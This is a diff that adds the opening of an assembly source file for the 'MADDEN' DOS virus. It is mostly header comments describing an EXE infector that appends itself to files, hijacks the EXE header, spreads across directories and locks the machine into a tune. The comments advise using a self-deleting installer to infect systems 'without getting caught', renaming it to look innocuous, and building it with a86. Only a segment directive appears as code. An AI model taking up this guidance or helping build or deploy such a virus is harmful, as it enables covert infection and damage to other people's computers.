@@ -1,0 +1,22 @@
+;The MADDEN virus is an EXE file infector which can jump from directory to
+;directory.   It attaches itself to the end of a file and
+;modifies the EXE file header so that it gets control first, before the host
+;program. When it is done doing its job, it passes control to the host program,
+;so that the host executes without a hint that the virus is there.
+
+
+	.SEQ                       ;segments must appear in sequential order
+				   ;to simulate conditions in actual active virus
+
+
+;MGROUP  GROUP   HOSTSEG,HSTACK     ;Host stack and code segments grouped together
+
+;HOSTSEG program code segment. The virus gains control before this routine and
+;attaches itself to another EXE file. As such, the host program for this
+;installer simply tries to delete itself off of disk and terminates. That is
+;worthwhile if you want to infect a system with the virus without getting
+;caught. Just execute the program that infects, and it disappears without a
+;trace. You might want to name the program something more innocuous, though.
+;MADDEN also locks the pc into a 'maddening' toon when it runs out
+;of files to infect. (MADDEN can be assembled to an .obj file under a86,
+;then linked to the 'infected' .exe form.)
